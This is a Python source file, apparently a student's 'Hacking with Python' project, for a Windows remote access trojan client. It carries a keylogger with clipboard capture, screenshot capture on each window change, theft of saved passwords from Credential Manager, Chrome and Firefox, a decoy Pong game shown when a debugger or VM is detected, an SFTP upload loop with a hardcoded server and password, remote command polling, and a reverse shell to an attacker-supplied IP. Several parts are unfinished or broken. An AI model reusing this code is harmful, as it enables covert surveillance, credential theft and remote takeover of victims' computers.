#The Client should be able to be installed via pip install client and an vulnerability in it
#Afterwards the client should be able to detect if Debuggers are present and if so, it should exit or run diffrent functionalitys
#It should also detect if it is run in a Virtual machine or a Sandbox and if so, it should exit or run diffrent functionalitys
#If nothing of that is detected, it should run the normal functionality, which is Keylogging taking pictures of every new Window and send that
#to the Server (in an adequate format). The Server should also be able to execute commands on the Client and get the output of that command


#Imports
import os
import socket
from ctypes import *
import pythoncom, pyWinhook, win32clipboard, win32gui, win32ui, win32con, win32api, pyaes, win32cred, pywintypes
import sqlite3, shutil, win32crypt, win32process, sys, random, pygame, time
from sys import gettrace as sys_gettrace
from tkinter import *
import pysftp
from _thread import *

#Variables
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
current_hwnd = 0
screenshot_path = "C:\\Users\\Manuel\\Studium\\Semester 5\\Hacking with Python\\Hausarbeite_Hacking_with_Python\\"
screenshot_number = 0
expression = ""

#Functions
#------------------------Normal/Fake Function (Game)------------------------
#Python program to create a simple GUI game using Pygame
def BALL_animation():
    global BALL_VEL_X, BALL_VEL_Y
    BALL.x += BALL_VEL_X
    BALL.y += BALL_VEL_Y
    #ballbouncing
    if BALL.top <= 0 or BALL.bottom >= HEIGHT:
        BALL_VEL_Y *= -1
    
    if BALL.left <= 0 or BALL.right >= WIDTH:
        BALL_restart()
        
    if BALL.colliderect(PLAYER) or BALL.colliderect(OPPONENT):
        BALL_VEL_X *= -1
    
        
def PLAYER_animation():
    PLAYER.y += PLAYER_VEL
    if PLAYER.top <= 0:
        PLAYER.top = 0
    if PLAYER.bottom >= HEIGHT:
        PLAYER.bottom = HEIGHT

def OPPONENT_animation():
    if OPPONENT.top + 20 < BALL.y:
        OPPONENT.top += OPPONENT_VEL
    if OPPONENT.bottom - 20 >= BALL.y:
        OPPONENT.bottom -= OPPONENT_VEL
    if OPPONENT.top <= 0:
        OPPONENT.top = 0
    if OPPONENT.bottom >= HEIGHT:
        OPPONENT.bottom = HEIGHT
        
def BALL_restart():
    global BALL_VEL_Y, BALL_VEL_X
    BALL.center = (WIDTH/2, HEIGHT/2)
    BALL_VEL_Y *= random.choice((1,-1))
    BALL_VEL_X *= random.choice((1,-1))

#general setup
pygame.init()
clock = pygame.time.Clock()

WIDTH, HEIGHT = 1280, 960
WIN = pygame.display.set_mode((WIDTH, HEIGHT))  #screen width/height
pygame.display.set_caption("Pong")    #header
FPS = 60


#game ractangles
BALL = pygame.Rect(WIDTH/2 - 15, HEIGHT/2 - 15, 30,30)
PLAYER = pygame.Rect(WIDTH - 20, HEIGHT/2 - 70,10,140)
OPPONENT = pygame.Rect(10, HEIGHT/2 - 70,10,140)

#background
BG = pygame.Color("grey12")
GREY = (200,200,200)

BALL_VEL_X = 7
BALL_VEL_Y = 7
PLAYER_VEL = 0
OPPONENT_VEL = 7

#simple pong game if debugger is detected
def game():
    while True:
        #handling input, checks if the close button got clicked!
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_DOWN:
                    PLAYER_VEL = 7
                if event.key == pygame.K_UP:
                    PLAYER_VEL = -7
            
            if event.type == pygame.KEYUP:
                if event.key == pygame.K_DOWN:
                    PLAYER_VEL = 0
                if event.key == pygame.K_UP:
                    PLAYER_VEL = 0
                    
        BALL_animation()
        PLAYER_animation()
        OPPONENT_animation()
        
        #visuals
        WIN.fill(BG)
        pygame.draw.rect(WIN, GREY, PLAYER)
        pygame.draw.rect(WIN, GREY, OPPONENT)
        pygame.draw.ellipse(WIN, GREY, BALL)
        pygame.draw.aaline(WIN,GREY,(WIDTH/2,0), (WIDTH/2, HEIGHT))
        
        #updating the window
        pygame.display.flip()
        clock.tick(FPS)
#------------------------END Normal/Fake Function (Game)------------------------


#------------------------Keylogger and Screenshotter------------------------
def get_current_process():
    #get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()
    #find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    #store the current process ID
    process_id = "\%d" % pid.value
    #grab the executable
    executable = create_string_buffer(b"\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process ,None ,byref(executable), 512)
    #now read its title
    window_title = create_string_buffer(b"\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
    #print out the header if we 're in the right process
    processinfo = "\n[ PID: \%s - \%s - \%s ]" % (process_id , executable.value, window_title.value) +"\n"
    print(processinfo)
    WriteToFile(processinfo)
    #close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
    #create and register a hook manager
    kl = pyWinhook.HookManager()
    kl.KeyDown = KeyStroke
    #register the hook and execute forever
    kl.HookKeyboard()
    pythoncom.PumpMessages()

def WriteToFile(s):
     #save keystrokes to a file
    if not os.path.exists(str(get_path()) + "keystrokes"):
        os.makedirs(str(get_path()) + "keystrokes")
        open(str(get_path()) + "/keystrokes/test.txt", "w")
    #Modus a + fuers updaten der datei
    file = open(str(get_path()) + '/keystrokes/test.txt', 'a+') 
    if s == "[Space]":
        file.write(" ")
    else:
        file.write(s)
    file.close()

def WritePasswordToFile(s):
    #save keystrokes to a file
    if not os.path.exists(str(get_path()) + "keystrokes"):
        os.makedirs(str(get_path()) + "keystrokes")
        open(str(get_path()) + "/keystrokes/enc_dec.txt", "w")
    #Modus a + fuers updaten der datei
    file = open(str(get_path()) + '/keystrokes/enc_dec.txt', 'a+') 
    file.write(s)
    file.close()

def KeyStroke(event) :
    global current_window
    #check to see if target changed windows
    if event.WindowName != current_window :
        current_window = event.WindowName
        global screenshot_number
        screenshot_number += 1
        SaveScreenshot("program" + str(screenshot_number) + ".png")
        get_current_process()
    #if they pressed a standard key
    if 32 < event.Ascii < 127:
        c = chr(event.Ascii)
        print(c)
        WriteToFile(c)
    else :
    #if [ Ctrl - V ] , get the value on the clipboard
        if event.Key == "V":
            win32clipboard.OpenClipboard()
            pasted_value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            p = "[PASTE] %s[PASTE]" % pasted_value
            print(p)
            WriteToFile(p)
        else :
            k = "[%s]" % event.Key
            print(k)
            WriteToFile(k)
    #pass execution to next hook registered
    return True


def SaveScreenshot(filename):
    #grab a handle to the main desktop window
    hdesktop = win32gui.GetDesktopWindow()
    #determine the size of all monitors in pixels
    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
    #create a device context
    desktop_dc = win32gui.GetWindowDC(hdesktop)
    img_dc = win32ui.CreateDCFromHandle(desktop_dc)
    #create a memory based device context
    mem_dc = img_dc.CreateCompatibleDC()
    #create a bitmap object
    screenshot = win32ui.CreateBitmap()
    screenshot.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshot)
    #copy the screen into our memory device context
    mem_dc.BitBlt((0 , 0), (width, height), img_dc, (left ,top), win32con.SRCCOPY)
    #save the bitmap to a file
    if not os.path.exists(str(get_path()) + "screenshots"):
        os.makedirs(str(get_path()) + "screenshots")
    screenshot.SaveBitmapFile(mem_dc, str(get_path()) + "/screenshots/" + filename)
    #free our objects
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshot.GetHandle())
    #number += 1
    #SaveScreenshot("test" + str(number) + ".png", number)
#------------------------END Keylogger and Screenshotter------------------------


#------------------------Communication encryption Function------------------------
def AESencrypt(message, key):
    key = "This is a key123"
    aes = pyaes.AESModeOfOperationCTR(str.encode(str(key)[:32]))
    ciphertext = aes.encrypt(message)
    return ciphertext

#Aes decrypt
def AESdecrypt(ciphertext, key):
    if type(ciphertext) == type("hallo"):
        ciphertext = bytes(ciphertext, 'utf-8')[2:-1]
        ciphertext = ciphertext.decode('unicode_escape').encode('raw_unicode_escape')
    aes = pyaes.AESModeOfOperationCTR(str.encode(str(key)[:32]))
    plaintext = aes.decrypt(ciphertext)
    return plaintext
#------------------------END Communication encryption Function------------------------

#------------------------Passwordextraction------------------------
#get current user path
def get_path():
    #name = os.getlogin()    #-to get only the username
    path = os.path.join(os.path.expandvars("%userprofile%" + "\\"))
    return path

#get all passwords from the windows credential manager
def get_credman_passwords(quiet=0):
    try:
        credman = win32cred.CredEnumerate(None, 0)
        for i in credman:
            password = win32cred.CredRead(i['TargetName'], i['Type'])
            if password['CredentialBlob']:
                WritePasswordToFile(password)
                password = password.encode('unicode_escape').decode('raw_unicode_escape')
                print(password)
                WritePasswordToFile("Encoded: " + str(password))
    except pywintypes.error as e:
        if not quiet:
            if e[0] == 5:
                print("Access denied.")
            elif e[0] == 1168:
                print("No credentials stored for this user.")
            elif e[0] == 1312:
                print("Call for CredEnumerate failed: No such login Session! Does not work for Network Logins.")
        return None

#get all passwords from the chrome database
def get_chrome_passwords(quiet=0):
    try:
        chrome_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
        shutil.copyfile(chrome_path, chrome_path + ".bak")
        conn = sqlite3.connect(chrome_path + ".bak")
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)
            if password[1]:
                WritePasswordToFile("Chrome Password: " + str(password))
    except sqlite3.OperationalError as e:
        if not quiet:
            if e[0] == 'Database is locked':
                print("Chrome is currently running. This function only works if Chrome is closed.")
            else:
                print(e)
        return None
    except pywintypes.error as e:
        if not quiet:
            if e[0] == 5:
                print("Access denied.")
            elif e[0] == 1168:
                print("No credentials stored for this user.")
        return None
    finally:
        conn.close()
        os.remove(chrome_path + ".bak")        

#get all passwords from the firefox database
def get_firefox_passwords(quiet=0):
    try:
        firefox_path = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Mozilla', 'Firefox', 'Profiles')
        for file in os.listdir(firefox_path):
            if file.endswith(".default"):
                conn = sqlite3.connect(os.path.join(firefox_path, file, 'signons.sqlite'))
                cursor = conn.cursor()
                cursor.execute('SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins')
                for result in cursor.fetchall():
                    password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)
                    if password[1]:
                        WritePasswordToFile("Firefox Password: " + str(password))
    except sqlite3.OperationalError as e:
        if not quiet:
            if e[0] == 'Database is locked':
                print("Firefox is currently running. This function only works if Firefox is closed.")
            else:
                print(e)
        return None
    except pywintypes.error as e:
        if not quiet:
            if e[0] == 5:
                print("Access denied.")
            elif e[0] == 1168:
                print("No credentials stored for this user.")
        return None
    finally:
        conn.close()
#------------------------END Passwordextraction------------------------

#------------------------Detect Debuggers------------------------
def is_debugger_present():
    if __debug__ == True or sys.gettrace() != None:
        return True
    else:
        return False

__debug__ #true if started with python -d, else wrong
#------------------------END Detect Debuggers------------------------

#------------------------Start detection of VM------------------------
def is_vm():
    try:
        if os.path.exists("C:\\Windows\\system32\\vmcheck.dll") or hasattr(sys, "getwindowsversion"):
            return True
        else:
            return False
    except:
        return False
#------------------------END detection of VM------------------------

#------------------------Reverse Shell Function------------------------
def reverse_shell(s):
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    os.pty.spawn("/bin/bash")

#------------------------END Reverse Shell Function------------------------

#------------------------Connection to FTPS server------------------------
def ftps_connect():
    cnopts = pysftp.CnOpts()
    cnopts.hostkeys = None
    ftps = pysftp.Connection(host="192.168.0.104", username="desktop-722h3i8\manue", password="Tennis12!", cnopts=cnopts)
    ftps.retrlines('LIST')
    return ftps

def ftps_upload_file(ftps, file):
    ftps.put(file, open(file, 'rb'))

def ftps_download_file(ftps, file):
    ftps.get(file, open(file, 'wb').write)

def ftps_create_dir(ftps, dir):
    ftps.mkdir(os.environ.get("USERNAME" + "/" + str(dir)))
    ftps.cd(os.environ.get("USERNAME" + "/" + str(dir)))

def ftps_check_dir(ftps, dir):
    try:
        ftps.cd(dir)
        return True
    except:
        ftps_create_dir(ftps, dir)
        return False
#------------------------END Connection to FTPS server------------------------

#Test all of the above functions:
def main():
    count = 0
    #debugger and vm detection, if detected open the game, otherwise the keylogger
    #if is_debugger_present() == True or is_vm() == True:   #-----------enable this one
    if 1 == 2: 
        print("Debugger detected!")
        game()
        sys.exit()
    else:
        #multithreading for keylogger and Screenshotsaving
        #start_new_thread(get_current_process, ())     #-----------enable this one
        #loop for connection protocol to FTPS server
        while True:
            try:
                ftps = ftps_connect() #for ipv4 connection test
                print("Connected to FTPS server! Debugging purpose, delete later!!")
            except:
                time.sleep(20)
                    
            
            #upload pictures and keylogger data to ftps server
            if os.path.exists(str(get_path()) + "/keystrokes/"):
                if count == 0:
                    ftps.mkdir(os.environ.get("USERNAME"))
                ftps_check_dir(ftps, str(get_path()) + "/keystrokes/")
                ftps_upload_file(ftps, str(get_path()) + "/keystrokes/keylogger.txt")
                ftps.cd("..")


            if os.path.exists(str(get_path()) + "/screenshots/") :
                if count == 0:
                    ftps.mkdir(os.environ.get("USERNAME"))
                ftps_check_dir(ftps, str(get_path()) + "/screenshots/")
                n = 0
                while screenshot_number < n:
                    ftps_upload_file(ftps, str(get_path()) + "/screenshots/screenshot" + str(n) + ".png")
                    n += 1
                ftps.cd("..")
            
            #check for commands from ftps server 
            if ftps_check_dir(ftps, str(os.environ.get("USERNAME") + "/commands/")) == True:
                ftps_download_file(ftps, str(os.environ.get("USERNAME") + "/commands/command.txt"))
                ftps.delete(str(os.environ.get("USERNAME") + "/commands/command.txt"))
                ftps.cd("..")
                ftps.cd("..")
                with open(str(get_path()) + "./commands/command.txt", "r") as f:     #path here will most likely be wrong (should be command.txt i think)
                    command = f.read()
                    if command == "get passwords":
                        get_chrome_passwords()
                        get_firefox_passwords()
                        time.sleep(2)
                        ftps_upload_file(ftps, str(get_path()) + "/keystrokes/enc_dec.txt")
                        ftps.delete(str(get_path()) + "/keystrokes/enc_dec.txt.txt")
                    elif command == "get screenshots":
                        n = 0
                        while screenshot_number < n:
                            ftps_upload_file(ftps, str(get_path()) + "/screenshots/program" + str(n) + ".png")
                            n += 1
                    elif command == "get keylogger":
                        ftps_upload_file(ftps, str(get_path()) + "/keystrokes/keylogger.txt")
                    
                    #everything after here is jet to come
                    elif command == "get process":
                        ftps_upload_file(ftps, str(get_path()) + "/process/process.txt")
                    elif command == "get systeminfo":
                        ftps_upload_file(ftps, str(get_path()) + "/systeminfo/systeminfo.txt")
                    
                    #will most likely not work like this.. but idea is good
                    elif command == "get reverse shell":
                        ftps_download_file(ftps, str(get_path()) + "/reverse_shell/reverse_shell.txt")
                        ftps.delete(str(get_path()) + "/reverse_shell/reverse_shell.txt")
                        ftps.cd("..")
                        ftps.cd("..")
                        with open(str(get_path()) + "/reverse_shell/reverse_shell.txt", "r") as f:  #most likely wrong path
                            ip = f.read()
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect((ip, 443))
                            reverse_shell(s)
                    
                    #also great commands, lets implement them later on (thats why i added them..)
                    elif command == "get webcam":
                        ftps_upload_file(ftps, str(get_path()) + "/webcam/webcam.jpg")
                        ftps.delete(str(get_path()) + "/webcam/webcam.jpg")
                    elif command == "get microphone":
                        ftps_upload_file(ftps, str(get_path()) + "/microphone/microphone.wav")
                        ftps.delete(str(get_path()) + "/microphone/microphone.wav")
                    elif command == "get clipboard":
                        pass

    #as everything seems to be great here (not quite sure if it works, but it should) lets implement the ssssServer! 
    pass
   #############to run this keylogger silently, meaning without a shown console, one would have to start it with pythonw <script.py>
   #############this is meant to run a script with a GUI. meaning the keylogger will be run silently in the background... (Start from Dropper software)

if __name__ == "__main__":
    main()




#Resources:
"""
SFTP Setup done like shown here: 
https://nagasudhir.blogspot.com/2022/03/setup-sftp-server-and-sftp-client-in.html
"""